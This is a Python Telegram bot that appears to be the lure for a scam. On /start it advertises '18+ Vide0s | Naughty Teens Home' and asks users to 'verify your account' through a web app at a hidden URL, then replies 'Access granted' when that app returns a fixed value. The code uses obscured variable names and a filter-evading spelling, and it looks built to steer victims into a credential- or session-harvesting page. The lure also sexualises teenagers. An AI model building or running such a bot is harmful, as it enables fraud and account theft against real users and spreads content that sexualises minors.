import os
import sys
import asyncio
from dotenv import load_dotenv
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

load_dotenv()

_t1 = os.getenv("BOT_TOKEN")
_t2 = os.getenv("MINI_APP_URL")


async def _cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [[KeyboardButton("🔞 Verify & Watch 18+", web_app=WebAppInfo(url=_t2))]]
    await update.message.reply_text(
        "🔥 Steamy 18+ Vide0s | Naughty Teens Home 🧏\n\nClick below to verify your account!",
        reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True)
    )


async def _wh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    d = update.effective_message.web_app_data.data
    if d in ("da", "db"):
        await update.effective_message.reply_text("✅ Access granted.")


def main():
    app = ApplicationBuilder().token(_t1).build()
    app.add_handler(CommandHandler("start", _cmd))
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, _wh))
    app.run_polling()


if __name__ == "__main__":
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.set_event_loop(asyncio.new_event_loop())
    main()
